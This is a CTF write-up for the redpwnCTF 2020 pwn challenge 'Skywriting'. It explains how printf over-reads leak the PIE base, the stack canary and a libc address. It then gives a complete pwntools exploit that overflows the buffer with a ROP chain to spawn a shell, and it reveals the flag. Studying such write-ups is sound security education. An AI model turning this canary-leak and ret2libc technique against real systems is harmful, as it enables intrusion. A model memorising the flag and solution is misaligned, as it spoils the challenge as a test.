# Skywriting
Pwn, 480

> It's pretty intuitive once you disambiguate some homoglyphs, I don't get why nobody solved it...
> 
> nc 2020.redpwnc.tf 31034

From the given Dockerfile, it's running on Ubuntu 18.04, which uses `libc.2-27.so`.

`pwn checksec skywriting` gives:
```
[*] '/home/boshua/skywriting/bin/skywriting'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All protections, yikes.

Open in Ghidra.

There's a check in the beginning to see if you entered a `1` to the first prompt. If not, you got a fake shell. I suppose this was used to include `system` in the PLT but I didn't use it anyway.

If you enter the strcmp'd string, `notflag{a_cloud_is_just_someone_elses_computer}`, to the second prompt, you see some suspicious characters before the `??`.

The program loops until the strcmp returns 0. It repeatedly reads in to the same buffer, so any data previously in the buffer will remain there so long as it's not overwritten by new data.

There's a pretty obvious buffer overflow, as `read` reads up to 0x200 characters, but there is a stack canary in place so I leaked that.

Remember, `printf` prints up until nullbytes. So, I can leak as much as I want by filling the buffer up to where I want to leak from.

I first leaked the PIE base, as that's where the gadgets are offset from.

Some gdb inspection reveals that there is a PIE pointer on the stack, and I needed 88 characters in the buffer to print it. I sent 87 "A"s, as there's still a newline (0xa) at the end of the input. Then, I subtracted an offset I found in GDB from it and got the actual PIE base.

Next, I leaked the canary, which is located right after the buffer. I filled up the buffer with 136 "A"s and a newline, leaking the canary.

You can't only send 135 "A"s and a newline, because the last byte of the canary ends in a 0x00 (probably to prevent these kinds of attacks from happening).

Luckily, the last byte of canaries are `0x00`.

Remember to replace the last byte of the receieved canary with `0x00` (it'll be a `0xa` from the newline).

After that, I leaked libc. It turns out there is a libc pointer which I leaked with 151 "A"s and a newline. Then I calculated the libc base using an offset I found in GDB, allowing me to ret2libc.

Finally, I overwrote the saved instruction pointer with a ROP chain which eventually calls system, and also kept the canary unmodified using the leaked canary.

On the last iteration, I exited out of the loop. So I sent the string to get strcmp to return 0, `notflag{a_cloud_is_just_someone_elses_computer}\n`.

There should be a `chr(0)` at the end of the string, so strcmp knows when to stop comparing.

Strcmp will see:
`notflag{a_cloud_is_just_someone_elses_computer}\n<null byte>\n`, and will only compare up to and including `notflag{a_cloud_is_just_someone_elses_computer}\n`.

So, the loop will terminate, and the program will load the saved RIP into RIP, which is now a ROP chain. It follows the execution, and spawns a shell.

```python
from pwn import *


p = remote("2020.redpwnc.tf", 31034)
#p = process("./bin/skywriting")
e = ELF("./bin/skywriting")
LIBC = ELF("./libc-2.27.so")


'''
gdb.attach(p, """pie break * 0x9ad
pie break * 0xa90
pie break * 0xb13
pie break * 0xb55
""")
'''

p.recvuntil("? ")
p.sendline("1")

# begin exploit
p.recvuntil(": ")

# leak pie base
p.sendline("A"*87)
print("sent pie leak")

dat = p.recvuntil(": ").lstrip("A").strip()
#print("dat", dat)
pie_leak = u64(dat[:6].ljust(8, "\x00"))

print("pie_leak", hex(pie_leak))

pie_base = pie_leak - 0xbbd

print("pie_base", pie_base)

# leak canary
p.sendline("A"*136)
print("sent canary leak")
dat = p.recvuntil(": ").lstrip("A")
#print("dat", dat)

canary = u64(dat[:8].ljust(8, "\x00"))


canary = list(hex(canary)[2:])
canary[-1] = "0"
canary = int(''.join(canary), 16)

print("canary", hex(canary))
#p.interactive()

# leak libc address
exploit = ""
exploit += "A"*151
p.sendline(exploit)
print("sent rbp exp")

dat = p.recvuntil(": ").lstrip("A").strip()

leak = u64(dat[:6].ljust(8, "\x00"))
print("leak", hex(leak))

LIBC.address = leak - 0x21b97

print("libc address", hex(LIBC.address))


# exploit bof

ret_g = pie_base + 0x78e
pop_rdi_ret_g = pie_base + 0xbd3

libc_system = LIBC.sym["system"]
binsh_str = next(LIBC.search("/bin/sh"))

print("ret", hex(ret_g))
print("pop rdi", hex(pop_rdi_ret_g))
print("libc system", hex(libc_system))
print("binsh str", hex(binsh_str))

exploit = ""
exploit += "A"*135 + chr(0)
exploit += p64(canary)
exploit += p64(0) + p64(ret_g) + p64(pop_rdi_ret_g) + p64(binsh_str) + p64(libc_system)

p.sendline(exploit)
print("sent bof")

# break out of loop
p.recvuntil(": ")
exploit = ""
exploit += "notflag{a_cloud_is_just_someone_elses_computer}\n"
exploit += chr(0)

p.sendline(exploit)
print("sent termination")

p.interactive()
```

Flag: `flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}`